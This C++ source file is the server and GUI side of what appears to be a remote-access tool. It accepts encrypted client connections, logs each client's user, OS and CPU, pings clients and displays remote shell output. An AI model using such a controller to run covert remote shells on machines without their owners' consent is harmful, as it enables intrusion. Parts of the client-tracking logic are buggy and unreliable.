#include "server.hpp"
#include "misc.hpp"
#include "frame_client.hpp"

//Definir el servidor globalmente
Servidor* p_Servidor;
std::mutex vector_mutex;


void MyLogClass::LogThis(std::string strInput, int iType){
    time_t temp = time(0);
    struct tm *timeptr = localtime(&temp);

    std::string strLine = "";
    
    switch (iType){
        case LogType::LogMessage:
            strLine = "[-] ";
            break;
        case LogType::LogError:
            strLine = "[X] ";
            break;
        case LogType::LogWarning:
            strLine = "[!] ";
            break;
        default:
            strLine = "[-] ";
            break; 
    }
    
    strLine += "[" + std::to_string(timeptr->tm_hour);
    strLine += ":" + std::to_string(timeptr->tm_min) + ":";
    strLine += std::to_string(timeptr->tm_sec) + "]  ";
    strLine += strInput + "\n";

    std::lock_guard<std::mutex> lock(this->log_mutex);
    if (this->p_txtCtrl != nullptr) {
        this->p_txtCtrl->AppendText(strLine);
    }

}

void Servidor::Init_Key() {
    for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
        this->bKey.push_back(this->t_key[i]);
    }
}

Servidor::Servidor(){
    this->uiPuertoLocal = 30000;

    //clase para logear
    this->m_txtLog = new MyLogClass();

    this->Init_Key();
    
}

bool Servidor::m_Iniciar(){
    WSACleanup();
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        return false;
    }

    this->sckSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if(!this->sckSocket){
        this->m_txtLog->LogThis("No se pudo crear el socket", LogType::LogError);
        return false;
    }

    int iTemp = 1;
    if(setsockopt(this->sckSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&iTemp, sizeof(int)) < 0){
        this->m_txtLog->LogThis("Error configurando el socket SO_REUSEADDR", LogType::LogError);
        return false;
    }

    unsigned long int iBlock = 1;
    if(ioctlsocket(this->sckSocket, FIONBIO, &iBlock) != 0){
        this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        error();
        return false;
    }

    this->structServer.sin_family        =                    AF_INET;
    this->structServer.sin_port          = htons(this->uiPuertoLocal);
    this->structServer.sin_addr.s_addr =                 INADDR_ANY;

    if(bind(this->sckSocket, (struct sockaddr *)&structServer, sizeof(struct sockaddr)) == -1){
        this->m_txtLog->LogThis("Error configurando el socket BIND", LogType::LogError);
        return false;
    }

    if(listen(this->sckSocket, 10) == -1){
        this->m_txtLog->LogThis("Error configurando el socket LISTEN", LogType::LogError);
        return false;
    }

    return true;
}

ClientConInfo Servidor::m_Aceptar(){
    struct ClientConInfo structNuevo;
    struct sockaddr_in structCliente;
    int iTempC = sizeof(struct sockaddr_in);
    SOCKET tmpSck = accept(this->sckSocket, (struct sockaddr *)&structCliente, &iTempC) ;
    if(tmpSck != INVALID_SOCKET){
        char strIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(structCliente.sin_addr), strIP, INET_ADDRSTRLEN);
        std::string strTmp = "Nueva conexion de ";
        strTmp += strIP;
        strTmp +=  ":" + std::to_string(ntohs(structCliente.sin_port));
        
        this->m_txtLog->LogThis(strTmp, LogType::LogMessage);
        
        structNuevo._strPuerto = std::to_string(ntohs(structCliente.sin_port));
        structNuevo._sckSocket = tmpSck;
        structNuevo._strIp = strIP;
    } else {
        structNuevo._sckSocket = tmpSck;
    }
        
    return structNuevo;
}

void Servidor::m_Handler(){
    this->p_Escuchando = true;

    this->thListener = std::thread(&Servidor::m_Escucha, this);
    this->thPing = std::thread(&Servidor::m_Ping, this);
}

void Servidor::m_JoinThreads() {
    if (this->thPing.joinable()) {
        this->thPing.join();
    }
    this->m_txtLog->LogThis("Thread PING terminada", LogType::LogMessage);

    if (this->thListener.joinable()) {
        this->thListener.join();
    }
    this->m_txtLog->LogThis("Thread LISTENER terminada", LogType::LogMessage);
}

void Servidor::m_StopHandler() {
    this->m_txtLog->LogThis("Apagando", LogType::LogError);
    std::lock_guard<std::mutex> lock(this->p_mutex);
    this->p_Escuchando = false;
}

void Servidor::m_CerrarConexion(SOCKET& pSocket) {
    if (pSocket != -1) {
        closesocket(pSocket);
        pSocket = INVALID_SOCKET;
    }
}

void Servidor::m_CerrarConexiones() {
    for (auto it = this->vc_Clientes.begin(); it != this->vc_Clientes.end();) {
        this->m_CerrarConexion(it->_sckCliente);
        it = this->vc_Clientes.erase(it);
    }
    closesocket(this->sckSocket);
    this->sckSocket = -1;
    this->iCount = 0;
}

void Servidor::m_Ping(){
    this->m_txtLog->LogThis("Thread PING iniciada", LogType::LogMessage);
    
    while(this->p_Escuchando){
        //Si no hay clientes seguir en el loop para cerrar thread mas rapido
        std::unique_lock<std::mutex> lock(this->count_mutex);
        if (this->iCount <= 0) {
            lock.unlock();
            Sleep(100);
            continue;
        }
        lock.unlock();
        
        std::unique_lock<std::mutex> lock2(vector_mutex);
        
        for(auto it = this->vc_Clientes.begin(); it != this->vc_Clientes.end();){
            if ((time(0) - it->_ttUltimaVez) <= PING_TIME) {
                    ++it;
                    continue;
            } else {
                if (!it->_isBusy) {
                    //Si no esta activo enviar el ping
                    int iBytes = this->cSend(it->_sckCliente, "PING~1", 6, 0, false);
                    if (iBytes <= 0) {
                        //No se pudo enviar el ping
                        std::string strTmp = "Cliente " + it->_strIp + "-" + it->_id + " desconectado";
                        this->m_txtLog->LogThis(strTmp, LogType::LogMessage);

                        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(it->_id);
                        if (temp) {
                            wxString strTmp = it->_id;
                            strTmp.append(1, '>');
                            strTmp += " desconectado";
                            temp->SetTitle(strTmp);
                        } else {
                            std::cout << "No se pudo encontrar el objeto\n";
                        }

                        this->m_RemoverClienteLista(it->_id);
                        it = this->vc_Clientes.erase(it);

                        std::unique_lock<std::mutex> lock3(this->count_mutex);
                        this->iCount--;
                    } else {
                        it->_ttUltimaVez = time(0);
                        ++it;
                    }
                } else {
                    ++it;
                }
            }
        }
        lock2.unlock(); //desbloquear vector
    }
}

void Servidor::m_Escucha(){
    this->m_txtLog->LogThis("Thread LISTENER iniciada", LogType::LogMessage);
    
    //Crear descriptor and setearlo a zero
    struct timeval timeout;
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    fd_set fdMaster;
    FD_ZERO(&fdMaster);
    
    FD_SET(this->sckSocket, &fdMaster);
    
    while(this->p_Escuchando){
        fd_set fdMaster_copy = fdMaster;
        
        int iNumeroSockets = select(this->sckSocket + 1, &fdMaster_copy, nullptr, nullptr, &timeout);
        
        for (int iCont = 0; iCont < iNumeroSockets; iCont++) {
            SOCKET iSock = fdMaster_copy.fd_array[iCont];

            if (iSock == this->sckSocket) {
                //Nueva conexion
                struct ClientConInfo sckNuevoCliente = this->m_Aceptar();
                
                //IP:PUERTO
                std::string strtmpIP = sckNuevoCliente._strIp;
                strtmpIP.append(1, ':');
                strtmpIP.append(sckNuevoCliente._strPuerto);

                //RANDOM ID
                std::string strTmpId = RandomID(7);
                strTmpId.append(1, '-');
                strTmpId += std::to_string(sckNuevoCliente._sckSocket);

                struct Cliente structNuevoCliente;
                structNuevoCliente._sckCliente = sckNuevoCliente._sckSocket;
                structNuevoCliente._ttUltimaVez = time(0);
                structNuevoCliente._id = strTmpId;
                structNuevoCliente._strIp = strtmpIP;

                //Agregar el cliente al fdmaster
                FD_SET(sckNuevoCliente._sckSocket, &fdMaster);

                //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
                std::unique_lock<std::mutex> lock(vector_mutex);
                this->vc_Clientes.push_back(structNuevoCliente);
                lock.unlock();
                
                
            } else {
                //Datos de algun cliente :v
                char cBuffer[4096];
                ZeroMemory(cBuffer, sizeof(cBuffer));

                int iRecibido = this->cRecv(iSock, cBuffer, sizeof(cBuffer), 0, false);
                if (iRecibido == WSAECONNRESET) {
                    //El cliente cerro la conexion
                    std::unique_lock<std::mutex> lock(vector_mutex);
                    
                    for (int i = 0; i < int(this->vc_Clientes.size()); i++) {
                        if (this->vc_Clientes[i]._sckCliente == iSock) {
                            this->vc_Clientes[i]._isBusy = false;
                            this->vc_Clientes[i]._ttUltimaVez = PING_TIME;

                            FD_CLR(iSock, &fdMaster);
                            break;
                        }
                    }
                    lock.unlock();
                    
                    continue;
                }

                if (iRecibido <= 0) {
                    closesocket(iSock);
                    FD_CLR(iSock, &fdMaster);
                } else {
                    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 10000000); //maximo 5 por ahora, pero se deberia de incrementar en un futuro

                    if(vcDatos[0] == "01") { //Paquete inicial user,so,cpu
                        struct Cliente structTmp;
                        std::unique_lock<std::mutex> lock(vector_mutex);
                        
                        for (auto vcCli : this->vc_Clientes) {
                            if (vcCli._sckCliente == iSock) {
                                vcCli._strSo = vcDatos[1];
                                vcCli._strUser = vcDatos[2];
                                vcCli._strCpu = vcDatos[3];
                                structTmp = vcCli;
                                break;
                            }
                        }
                        lock.unlock();
                        
                        std::unique_lock<std::mutex> lock2(this->count_mutex);
                        this->m_InsertarCliente(structTmp);
                        this->iCount++;
                    }

                    if (vcDatos[0] == "02") {//Pong
                        std::unique_lock<std::mutex> lock(vector_mutex);
                        
                        for (auto vcCli : this->vc_Clientes) {
                            if (vcCli._sckCliente == iSock) {
                                vcCli._ttUltimaVez = time(0);
                                break;
                            }
                        }
                        lock.unlock();
                        
                    }

                    if (vcDatos[0] == "03") { //CUSTOM_TEST
                        std::string strTempID = "";
                        std::unique_lock<std::mutex> lock(vector_mutex);
                        for (auto vcCli : this->vc_Clientes) {
                            if (vcCli._sckCliente == iSock) {
                                strTempID = vcCli._id;
                                break;
                            }
                        }
                        lock.unlock();

                        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(strTempID);
                        if (temp) {
                            panelTest* temp_panel = (panelTest*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Test, temp);
                            if (temp_panel) {
                                wxStaticText* temp_static_text = (wxStaticText*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Label_Test, temp_panel);
                                if (temp_static_text) {
                                    temp_static_text->SetLabelText(vcDatos[1]);
                                }
                            }
                        } else {
                            std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
                        }

                    }

                    if (vcDatos[0] == "05") { //Termino la shell
                        std::string strTempID = "";
                        std::unique_lock<std::mutex> lock(vector_mutex);
                        for(auto vcCli = this->vc_Clientes.begin(); vcCli != this->vc_Clientes.end(); vcCli++){
                            if (vcCli->_sckCliente == iSock) {
                                strTempID = vcCli->_id;
                                vcCli->_isRunningShell = false;
                                break;
                            }
                        }
                        lock.unlock();

                        isEscribirSalidaShell(strTempID, vcDatos[1]);
                    }

                    if (vcDatos[0] == "06") {
                        std::string strOutJoined = "";
                        for (int i = 1; i<int(vcDatos.size()); i++) {
                            strOutJoined += vcDatos[i] + "\\";
                        }
                        strOutJoined = strOutJoined.substr(0, strOutJoined.size() - 1);

                        std::string strTempID = "";
                        std::unique_lock<std::mutex> lock(vector_mutex);
                        for (auto vcCli : this->vc_Clientes) {
                            if (vcCli._sckCliente == iSock) {
                                strTempID = vcCli._id;
                                break;
                            }
                        }
                        lock.unlock();

                        isEscribirSalidaShell(strTempID, strOutJoined);

                    }
                }
            }


        }
    }
    std::cout << "DONE Listen" << std::endl;
}

void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
    m_listCtrl->InsertItem(this->iCount, wxString(p_Cliente._id));
    m_listCtrl->SetItem(this->iCount, 1, wxString(p_Cliente._strUser));
    m_listCtrl->SetItem(this->iCount, 2, wxString(p_Cliente._strIp));
    m_listCtrl->SetItem(this->iCount, 3, wxString(p_Cliente._strSo));
    m_listCtrl->SetItem(this->iCount, 4, wxString(p_Cliente._strCpu));
}

void Servidor::m_RemoverClienteLista(std::string p_ID){
    long lFound = this->m_listCtrl->FindItem(0, wxString(p_ID));
    if(lFound != wxNOT_FOUND){
        this->m_listCtrl->DeleteItem(lFound);
    } else{
        error();
    }
}

int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock) {
    // 1 non block
    // 0 block
    
    ByteArray cData = this->bEnc((const unsigned char*)pBuffer, pLen);
    std::string strPaqueteFinal = "";
    for (auto c : cData) {
        strPaqueteFinal.append(1, c);
    }

    if (isBlock) {
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }

        int iEnviado = send(pSocket, strPaqueteFinal.c_str(), cData.size(), pFlags);
        
        //Restaurar
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }

        return iEnviado;
    }
    else {
        int iEnv = send(pSocket, strPaqueteFinal.c_str(), cData.size(), pFlags);
        return iEnv;
    } 
}

int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock) {
    
    // 1 non block
    // 0 block
    
    char *cTmpBuff = new char[pLen];
    ZeroMemory(cTmpBuff, pLen);
    int iRecibido = 0;
    
     if (isBlock) {
        //Hacer el socket block
        unsigned long int iBlock = 0;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }

        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        
        if (GetLastError() == WSAECONNRESET) {
            //funado el cliente
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return WSAECONNRESET;
        }

        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }
        //Decrypt
        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        std::string strOut = "";
        //set a 0 para volver a contar los bytes
        iRecibido = 0;
        for (auto c : bOut) {
            strOut.append(1, c);
            iRecibido++;
        }
        _memccpy(pBuffer, strOut.c_str(), '\0', 1024);

        //Restaurar
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }

        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }else {
        iRecibido = recv(pSocket, cTmpBuff, pLen, pFlags);
        
        if (GetLastError() == WSAECONNRESET) {
            //funado el cliente
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return WSAECONNRESET;
        }
        if (iRecibido <= 0) {
            if (cTmpBuff) {
                ZeroMemory(cTmpBuff, pLen);
                delete[] cTmpBuff;
            }
            return -1;
        }

        ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);

        std::string strOut = "";
        iRecibido = 0;
        for (auto c : bOut) {
            strOut.append(1, c);
            iRecibido++;
        }
        memccpy(pBuffer, strOut.c_str(), '\0', 1024);

        if (cTmpBuff) {
            ZeroMemory(cTmpBuff, pLen);
            delete[] cTmpBuff;
        }
        return iRecibido;
    }
}


//AES256
ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen) {
    //this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        std::cout<<"Error encriptando "<<pInput<<"\n";
    }
    return bOutput;
}

ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen) {
    //this->Init_Key();
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        std::cout << "Error desencriptando " << pInput << "\n";
    }
    return bOutput;
}

//control list events
void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {
    
    wxMenu menu;
    menu.Append(EnumIDS::ID_Interactuar, "Administrar");
    menu.AppendSeparator();
    menu.Append(wxID_ANY, ":v");

    PopupMenu(&menu, pos.x, pos.y);
}

void MyListCtrl::OnContextMenu(wxContextMenuEvent& event)
{
    if (GetEditControl() == NULL)
    {
        wxPoint point = event.GetPosition();
        
        // If from keyboard
        if ((point.x == -1) && (point.y == -1))
        {
            wxSize size = GetSize();
            point.x = size.x / 2;
            point.y = size.y / 2;
        }
        else
        {
            point = ScreenToClient(point);
        }
        
        int flags;
        long iItem = HitTest(point, flags);

        if (iItem == -1) {
            return;
        }

        wxString st1 = this->GetItemText(iItem, 0);
        this->strTmp = st1;
        this->strTmp.append(1, '/');
        this->strTmp += this->GetItemText(iItem, 1);
        this->strTmp.append(1, '/');
        this->strTmp += this->GetItemText(iItem, 2);

        ShowContextMenu(point, iItem);
    }
    else
    {
        // the user is editing:
        // allow the text control to display its context menu
        // if it has one (it has on Windows) rather than display our one
        event.Skip();
    }
}

void MyListCtrl::OnInteractuar(wxCommandEvent& event) {
    //long lFound = this->FindItem(0, vcOut[0]);
    std::vector<std::string> vcOut = strSplit(strTmp.ToStdString(), '/', 2);
    
    
    FrameCliente* n_FrameCli = new FrameCliente(this->strTmp.ToStdString(), vcOut[0]);
    n_FrameCli->Show(true);
}


